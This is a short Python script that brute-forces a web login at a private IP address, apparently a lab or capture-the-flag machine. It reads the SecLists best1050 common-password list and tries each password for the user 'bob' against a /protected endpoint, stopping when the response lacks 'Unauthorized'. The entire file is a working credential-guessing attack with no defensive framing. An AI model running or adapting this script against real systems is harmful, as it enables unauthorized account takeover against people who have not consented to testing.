#!/usr/bin/python3

import requests

url = "http://10.10.80.232/"

with open("/usr/share/seclists/Passwords/Common-Credentials/best1050.txt", 'r') as f:
	data = f.read().splitlines()

print("[*]Runnig")
#print(data)
for password in data:
	#print(password)
	payload = {"Username": "bob", "Password" : f"{password}"}
	r = requests.get(url + "protected", data=payload)
	if("Unauthorized" not in r.text):
		print(f"Pass->{password}")
		print(r.text)
		break
